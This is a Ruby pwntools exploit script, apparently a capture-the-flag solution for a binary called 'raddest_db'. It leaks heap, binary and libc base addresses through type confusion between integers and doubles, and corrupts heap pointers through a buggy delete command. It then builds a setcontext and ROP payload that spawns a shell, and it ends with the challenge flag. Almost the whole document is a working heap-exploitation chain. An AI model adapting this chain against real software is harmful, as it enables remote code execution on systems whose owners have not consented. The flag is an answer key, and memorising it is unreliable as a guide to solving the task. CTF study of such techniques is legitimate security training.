#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo

host, port = 'challenges.fbctf.com', 1337
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new host, port
def z;$z;end
@p = 'raddest_db'
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
def debug!; context.log_level = :debug; end
#================= Exploit Start ====================
context.arch = :amd64
# debug!

def pt; z.get '>>> '; end

def create(name)
  # pt
  z.puts "create #{name}"
  name
end
def store(db = '', key, val)
  type = case val
         when Integer then 'int'
         when String then 'string'
         when Float then 'float'
         else fail
         end
  z.puts "store #{db} #{type} #{key} #{val}"
end

def get(db, key)
  z.puts "get #{db} #{key}"
end

def echo(s)
  z.puts "echo #{s}"
end

def getter(db, key, ops)
  z.puts "getter #{db} #{key} #{ops.size}"
  ops.each { |op| z.puts op }
end

@leak = create('le30')
def leak(addr)
  if block_given?
    yield
  else
    store(@leak, 0, 'XXXXXXXX')
    store(@leak, 0, i2d(addr))
  end
  echo('LEAK')
  get(@leak, 0)
  z.gets "LEAK\n>>> "
  z.gets[0..-2].tap { z.puts "delete #{@leak} 0" }
end

def i2d(val)
  val.p64.unpack("D*")[0]
end

heap = leak(0) do
  store(@leak, 0, 1)
  store(@leak, 0, 'xx')
end.to_i - 0x12210

h.offset(heap)
log.dump heap.hex

# to have binary address on heap
getter(@leak, 1, ['echo YA'])
elf.address = (leak(heap+0x12250) + "\x00\x00").u64 - 0x4d52

h.offset(elf.address)
log.dump elf.address.hex

libc = ELF.new('../libc-2.27.so')
libc.address = (leak(elf.got['alarm']) + "\x00\x00").u64 - libc.symbols['alarm']

h.offset(libc.address)
log.dump libc.address.hex

data = create('data')
store(data, 0, i2d(libc.address + 0x520a5)) # setcontext
# store(data, 0, i2d(0xdeadbeef))
store(data, 1, i2d(heap + 0x12478))

target = heap + 0x12ed0

sh = libc.address + 0x1b3e9a
stk_addr = heap + 0x12f80
pop_rdi = elf.address + 0x33c7
payload = flat(heap + 0x12478, 'A' * 0x90, 0, stk_addr, pop_rdi, sh, libc.one_gadgets[0])


db = create('db')
4.times { |i| store(db, i * 15, i.to_s * 10) }

c30_ptr = heap + 0x11f9a
getter(db, 2 * 15, [
  "store string 3 #{'c' * 0x40 + p64(c30_ptr)[0, 6]}",
  'delete 30', # parser of delete command is buggy
  "store string 1 #{'A' * 0x10 + target.p64[0, 6]}",
])

create(payload)

z.puts 'print db'

z.interact

# fb{everything_has_side_3ffects_N0w}
